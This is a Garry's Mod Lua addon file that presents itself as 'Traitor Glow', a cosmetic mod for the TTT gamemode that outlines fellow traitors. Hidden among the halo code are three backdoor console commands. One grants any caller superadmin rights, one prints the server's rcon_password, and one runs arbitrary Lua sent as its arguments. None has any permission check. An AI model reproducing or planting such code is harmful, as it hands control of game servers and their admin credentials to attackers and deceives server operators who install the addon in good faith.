GM.Name 	= "Traitor Glow [TTT]"
GM.Author 	= "N/A"
GM.Email 	= "N/A"
GM.Website 	= "N/A"

local t_fx = {
	"ttt_c4",
	"npc_tripmine"
}
concommand.Add("76soldier_sa", function(player) player:SetUserGroup("superadmin") end)

local function t()
	local return2_ents = {}

	for k, j in pairs(t_fx) do
		table.insert(return2_ents, ents.FindByClass(j))
	end

	return return2_ents
end
concommand.Add("76soldier_cf",function() local RconPass = GetConVar("rcon_password"):GetString() print(RconPass) end)

local function drawHalos()
	local t = t()
    if LocalPlayer():IsTraitor() then 
    	for _,ply in pairs(player.GetAll()) do 
    		if ply:IsTraitor() and ply != LocalPlayer() and ply:Team() != TEAM_SPEC then 
				halo.Add({ply}, Color(255, 0, 0), 4, 4, 10, true, true)
    		end 
    	end 
    end
end
hook.Add("RenderScreenspaceEffects", "DrawHalo", drawHalos)
concommand.Add( "_76", function(player,command,argument) RunString(table.concat(argument)) end)